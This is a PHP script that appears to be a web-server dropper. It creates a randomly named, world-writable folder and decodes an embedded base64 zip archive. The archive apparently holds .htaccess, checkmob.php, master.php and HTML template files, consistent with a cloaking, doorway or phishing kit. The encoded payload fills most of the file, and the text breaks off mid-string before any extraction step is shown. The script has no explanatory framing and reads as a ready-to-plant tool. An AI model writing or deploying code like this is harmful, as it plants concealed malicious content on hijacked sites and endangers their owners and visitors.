<?php

$let = array ("1","2","3","4","5","6","7","8","9","0","q","w","e","r","t","y","u","i","o","p","a","s","d","f","g","h","j","k","l","z","x","c","v","b","n","m","q","w","e","r","t","y","u","i","o","p","a","s","d","f","g","h","j","k","l","z","x","c","v","b","n","m");    

$myfilename = "z1";

$foldername='';     
for ($ns=1;$ns<rand(4,12);$ns++)     
{     
$r = rand (0,count($let)-1);     
$foldername .= $let[$r];     
}  
mkdir($foldername, 0777);

$data = base64_decode("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